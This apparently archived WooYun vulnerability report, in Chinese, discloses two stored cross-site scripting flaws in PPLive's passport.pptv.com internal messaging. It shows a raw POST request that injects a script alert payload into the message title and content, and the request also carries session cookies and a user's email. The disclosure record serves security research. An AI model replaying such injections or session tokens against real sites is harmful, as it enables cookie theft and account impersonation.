{"id": 24381, "wybug_id": "wooyun-2010-0135", "wybug_title": "pplive网站2处存储型跨站弱点", "wybug_corp": "pplive", "wybug_author": "Liscker", "wybug_date": "2010-07-30 13:33", "wybug_open_date": "2010-07-30 14:36", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "强交互接口里"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2010-07-30：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2010-07-30：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： pplive网站2处存储型跨站弱点。 详细说明：  passport.pptv.com网站中的小纸条（站内信）功能存在跨站弱点。标题、内容都可直接写入跨站代码并发送信件，虽然标题有字数限制，但可以通过自己提交post包绕过。经过验证，如果直接在标题中添加跨站代码，受害者打开收件箱即触发跨站！可窃取用户cookie并仿冒用户登录。   漏洞证明：  POST /addmessage.do HTTP/1.1Accept: */*Referer: http://passport.pptv.com/writemessage.do?Accept-Language: zh-cnContent-Type: application/x-www-form-urlencodedUA-CPU: x86Accept-Encoding: gzip, deflateUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2; .NET CLR 1.1.4322; InfoPath.2; .NET CLR 2.0.50727)Host: passport.pptv.comContent-Length: 157Connection: Keep-AliveCache-Control: no-cacheCookie: JSESSIONID=app4~abcbBzsNKnEJd4WrC1HOs; dmt4574c0e597937=4%7C0; dm4574c0e597937=1%7C1280467956%7C0%7C%7C; PPKey=c2dsKhvDvQu2vkuxhw8OYdBaEjbeINm2singwpLwCO8NZo0%2Fh7SSpq2sX5i1B9KLePHVuwm%2BH4D3Qx2KGtG1XexyJX6LLo7Q8phnOkZgWwSMg%2B6OM0no5ycVBD7gcv1WL%2FIelyIVIGDfx%2FQ0Lm2GW5lhOOA%2Bmh5kSmwAIseyoILjQGXQKNTd7pMJMrZwAeU7d%2FB9X%2Fa9ci8%3D; PPName=cnfection$32ACFA6BA2CB46F39F3905112211C6D4; UDI=1$30$0$PP%E6%B8%B8%E6%B0%91$PP%E5%AE%9E%E4%B9%A0%E7%94%9F$201$%E7%9C%81%E4%BB%BD%C2%B7%E5%9F%8E%E5%B8%82$0$0$ppface.jpg$cnfection2%40qq.com$0%E5%88%86%E9%92%9F$2009%E5%B9%B412%E6%9C%8818%E6%97%A5$$$temp=&receiver=test&title=<script>alert(/liscker/);</script>&content=<script>alert(/liscker/);</script>&submit=%E5%A5%BD%E4%BA%86%EF%BC%8C%E5%8F%91%E5%87%BA   修复方案：  过滤跨站关键字   版权声明：转载请注明来源 Liscker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：8 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 8, "Ranks": null}